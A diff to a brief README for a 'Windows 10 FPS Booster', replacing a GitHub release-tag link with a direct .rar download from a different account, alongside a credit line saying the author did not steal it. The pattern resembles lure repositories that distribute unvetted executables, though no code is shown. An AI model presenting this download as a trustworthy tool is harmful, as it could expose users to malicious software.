@@ -1,6 +1,6 @@
 ## <p align="middle"> Windows 10 FPS Booster 
 
-### <p align="middle"> DOWNLOAD : [Click Here](https://github.com/SmurfsCC/FPS-Booster-/releases/tag/Windows)
+### <p align="middle"> DOWNLOAD : [Click Here](https://github.com/Speedyreal/Windows10BoosterFPS/releases/download/Windows10/Windows10BoosterFPS.rar)
   
   ##### <p align="middle"> Everything I leave all credit to who made it. I didn't steal him. 💡
 
